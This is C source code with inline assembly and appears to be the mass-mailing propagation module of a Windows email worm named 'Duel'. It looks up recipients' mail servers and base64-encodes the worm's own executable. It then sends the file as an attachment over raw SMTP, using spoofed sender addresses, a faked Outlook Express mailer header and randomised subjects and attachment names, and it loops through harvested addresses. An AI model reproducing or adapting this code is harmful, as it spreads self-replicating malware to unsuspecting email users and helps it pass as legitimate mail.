#include "stdafx.h"
#include "prototypes.h"
#include "winsock2.h"
#include "stdlib.h"
#include "windns.h"

typedef DNS_STATUS (__stdcall *xDnsQuery)(PCSTR,WORD,DWORD,PIP4_ARRAY,PDNS_RECORD*,PVOID*);

BOOL GetMxAddr(char domain[],char *mx_server)	/*(C) DR-EF*/
{
	HMODULE hdns;
	BOOL retval=FALSE;
	xDnsQuery DnsQuery=NULL;
	DNS_STATUS fdns;
	DNS_RECORD *dns_info;

	hdns=LoadLibrary("Dnsapi.dll");

	if(hdns!=NULL)
	{
		xDnsQuery DnsQuery=(xDnsQuery)GetProcAddress(hdns,"DnsQuery_A");

		fdns=DnsQuery(domain,DNS_TYPE_MX,DNS_QUERY_STANDARD,NULL,&dns_info,NULL);

		if(fdns==ERROR_SUCCESS)
		{
			if(dns_info->wType==DNS_TYPE_MX)
			{
				lstrcpy(mx_server,dns_info->Data.Mx.pNameExchange);
				retval=TRUE;
			}
		}

		FreeLibrary(hdns);
	}

	return retval;
}



int Base64(char *StartOfData,char *Output,int SizeOfData)
{

	int retval=0;

	char Base64Table[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

	__asm
	{
		mov		esi,[StartOfData]
		mov		edi,[Output]
		mov		ecx,[SizeOfData]
		xor		edx,edx
		push	ecx
		push	ecx
		mov		eax,ecx
		mov		ecx,3h
		div		ecx
		or		edx,edx
		jne		setr
		mov		ecx,edx
		jmp		nori
setr:	sub		ecx,edx
nori:	mov		[esp+4h],ecx
		pop		ecx
		xor		edx,edx
		push	edx
x3Bytes:push	edx
		xor		eax,eax
		xor		ebx,ebx
		or		al,byte ptr [esi]
		shl		eax,8h
		inc		esi
		or		al,byte ptr [esi]
		shl		eax,8h
		inc		esi
		or		al,byte ptr [esi]
		inc		esi
		push	ecx
		mov		ecx,4h
outbit: mov		ebx,eax
		and		ebx,3fh				;leave only 6 bits
		lea		edx,[Base64Table]
		mov		bl,byte ptr [ebx + edx]
		mov		byte ptr [edi + ecx - 1h],bl
		shr		eax,6h
		loop	outbit
		add		edi,4h
		pop		ecx
		pop		edx
		add		edx,4h
		add		dword ptr [esp],4h
		sub		ecx,3h
		jecxz	ExitB64
		cmp		ecx,0
		jb		ExitB64
		rcl		ecx,1h
		jc		ExitB64
		rcr		ecx,1h
		cmp		edx,4ch				;did we need to add new line ?
		jne		DoLoop
		xor		edx,edx
		mov		word ptr [edi],0a0dh
		add		edi,2h
		add		dword ptr [esp],2h
DoLoop:	or		ecx,ecx
		jne		x3Bytes
ExitB64:pop		eax
		pop		ecx
		jecxz	b64out				;data is aligned by 3,all fine
		cmp		ecx,1h
		jne		pad2
		mov		byte ptr [edi-1h],'='
		jmp		b64out
pad2:	mov		word ptr [edi-2h],'=='
b64out:	mov		[retval],eax
	}

	return retval;

}


BOOL base64_worm_encode(char file[],HGLOBAL &mem,int &size)
{
	/*
		base64 image creation function

		paramters:
		----------
		file		[input]		- file path
		mem			[output]	- memory with image
		size		[output]	- image size

		return value:

		true\false

	*/

	HANDLE hfile,hmap,hmapbase;
	DWORD fsize;
	HGLOBAL hmem;

	int Encoded_data_size;

	hfile=CreateFile(file,GENERIC_READ,FILE_SHARE_READ,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;

	fsize=GetFileSize(hfile,NULL);

	if(fsize==0xFFFFFFFF)
	{
		CloseHandle(hfile);
		return FALSE;
	}

	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);

	if(hmap==NULL)
	{
		CloseHandle(hfile);
		return FALSE;
	}

	hmapbase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,NULL,NULL);

	if(hmapbase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	hmem=GlobalAlloc(GPTR,((fsize*3)+(fsize/3)+(fsize/4)+0x400));		//allocate memory

	if(hmem==NULL)
	{
		UnmapViewOfFile(hmapbase);
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	Encoded_data_size=Base64((char *)hmapbase,(char *)hmem,fsize);

	UnmapViewOfFile(hmapbase);
	CloseHandle(hmap);
	CloseHandle(hfile);


	mem=hmem;

	size=Encoded_data_size;

	return TRUE;
}

void Base64_free_image(HGLOBAL mem)
{
	GlobalFree(mem);
}


SOCKET ConnectSmtp(char Addr[])
{
	WSADATA wsd;
	LPHOSTENT hostnt;
	SOCKET retsocket;
	sockaddr_in sin;

	if(WSAStartup(MAKEWORD(1,1),&wsd)==0)
	{
		retsocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

		if(retsocket!=INVALID_SOCKET)
		{
			hostnt=gethostbyname(Addr);
			if(hostnt!=NULL)
			{
				sin.sin_family=AF_INET;
				sin.sin_port=htons(25);	//smtp
				sin.sin_addr=*((LPIN_ADDR)*hostnt->h_addr_list);
				if(connect(retsocket,(LPSOCKADDR)&sin,sizeof(struct sockaddr))==0)
					return retsocket;
			}
			closesocket(retsocket);
		}

		WSACleanup();
	}


	return NULL;
}

SOCKET DuelConnectSMTP(char Mail[])
{
	/*
		find smtp server from the registry,and connect to it
		if fail,try to connect to mail/smtp @ user isp

		input: mail address

		if fail return NULL,if success return socket of the smtp connection

	*/


	char maildomain[50],mx_server[60];

	int i=0,x=0;

	SOCKET retsock=NULL;

	do
	{
		i++;
	}while(Mail[i]!='@');

	i++;

	do
	{
		maildomain[x]=Mail[i];
		i++;
		x++;
	}while(Mail[i]!=NULL);

	maildomain[x]=NULL;

	if(GetMxAddr(maildomain,mx_server)==TRUE)
		retsock=ConnectSmtp(mx_server);


	return retsock;
}

void DuelMassMail(DuelMailList &xml,MailInfoList MIL,char WormPath[])
{

	SOCKET msocket=NULL;
	HGLOBAL Base64Worm;
	int Base64Worm_Size,retval,i,x,y,z;
	BOOL SendSuccess=FALSE;

//	WaitForInetConnection();			//wait till we have internet connection

	char Bound[20],buffer[4096],cmdbuf[90],xdomain[50],faked_mfrom[60];

	char mime_header[]="From: <%s>\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed;\r\n\tboundary=\"%s\"\r\nX-Priority: 3\r\nX-MSMail-Priority: Normal\r\nX-Mailer: Microsoft Outlook Express 6.00.2800.1106\r\nX-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106\r\n\r\nThis is a multi-part message in MIME format.\r\n--%s\r\nContent-Type: text/plain;\r\n\tcharset=\"windows-1255\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n%s\r\n--%s\r\nContent-Type: application/octet-stream;\r\n\tname= \"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\tfilename= \"%s\"\r\n\r\n";

	AddToLog("Starting Mail Function!",Duel_Log_Custom,TRUE);

	if(xml.NumberOfMails!=0 && base64_worm_encode(WormPath,Base64Worm,Base64Worm_Size)==TRUE)
	{
		do
		{
			msocket=DuelConnectSMTP(xml.Email[xml.NumberOfMails-1]);

			if(msocket!=NULL)
			{

				RandomString(Bound,(sizeof(Bound)-1),FALSE);

				srand(GetTickCount());

				retval=recv(msocket,buffer,sizeof(buffer),0);

				if(retval!=SOCKET_ERROR && retval!=0)
				{
					if(memcmp(buffer,"220",3)==0)
					{
						lstrcpy(cmdbuf,"HELO <localhost>\r\n");
						send(msocket,cmdbuf,lstrlen(cmdbuf),0);

						retval=recv(msocket,buffer,sizeof(buffer),0);

						if(retval!=SOCKET_ERROR && retval!=0)
						{
							if(memcmp(buffer,"250",3)==0)
							{

								i=0;
								x=0;

								do
								{
									i++;
								}while(xml.Email[xml.NumberOfMails-1][i]!='@');

								i++;

								do
								{
									xdomain[x]=xml.Email[xml.NumberOfMails-1][i];
									i++;
									x++;
								}while(xml.Email[xml.NumberOfMails-1][i]!=NULL);

								xdomain[x]=NULL;

								x=(rand() % 7);

								if(x<4)
								{
									GetRndUserStr(faked_mfrom,TRUE);
									lstrcat(faked_mfrom,"@");
								}
								else
								{
									RandomString(faked_mfrom,6,FALSE);
									CharLower(faked_mfrom);
									faked_mfrom[5]='@';
								}

								lstrcat(faked_mfrom,xdomain);

								wsprintf(cmdbuf,"MAIL FROM:<%s>\r\n",faked_mfrom);

								send(msocket,cmdbuf,lstrlen(cmdbuf),0);

								retval=recv(msocket,buffer,sizeof(buffer),0);

								if(retval!=SOCKET_ERROR && retval!=0)
								{
									if(memcmp(buffer,"250",3)==0)
									{
										wsprintf(cmdbuf,"RCPT TO:<%s>\r\n",
											xml.Email[xml.NumberOfMails-1]);

										send(msocket,cmdbuf,lstrlen(cmdbuf),0);

										retval=recv(msocket,buffer,sizeof(buffer),0);

										if(retval!=SOCKET_ERROR && retval!=0)
										{
											if(memcmp(buffer,"25",2)==0)
											{
												lstrcpy(cmdbuf,"DATA\r\n");

												send(msocket,cmdbuf,lstrlen(cmdbuf),0);

												retval=recv(msocket,buffer,sizeof(buffer),0);

												if(retval!=SOCKET_ERROR && retval!=0)
												{
													if(memcmp(buffer,"354",3)==0)
													{
														x=(rand() % MIL.NumberOf_Subjects); //subjet
														y=(rand() % MIL.NumberOf_Attachments); //attach
														z=(rand() % MIL.NumberOf_Texts); //msg

														wsprintf(buffer,mime_header,faked_mfrom,
															MIL.mail_info_list[x].subject,Bound,
															Bound,MIL.mail_info_list[z].text,
															Bound,MIL.mail_info_list[y].attachment,
															MIL.mail_info_list[y].attachment);

														send(msocket,buffer,lstrlen(buffer),0);

														send(msocket,(char *)Base64Worm,
															Base64Worm_Size,0);

														wsprintf(buffer,"\r\n--%s--\r\n",Bound);
														send(msocket,buffer,lstrlen(buffer),0);

														lstrcpy(buffer,"\r\n.\r\n");
														send(msocket,buffer,lstrlen(buffer),0);

														SendSuccess=TRUE;

														recv(msocket,buffer,sizeof(buffer),0);
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				closesocket(msocket);
			}

			AddToLog(xml.Email[xml.NumberOfMails-1],Duel_Log_Mail_Sended,SendSuccess);

			xml.NumberOfMails--;

			SendSuccess=FALSE;

			Sleep(5000);

		}while(xml.NumberOfMails!=0);
	}
	AddToLog("Mail Function Finished",Duel_Log_Custom,TRUE);
}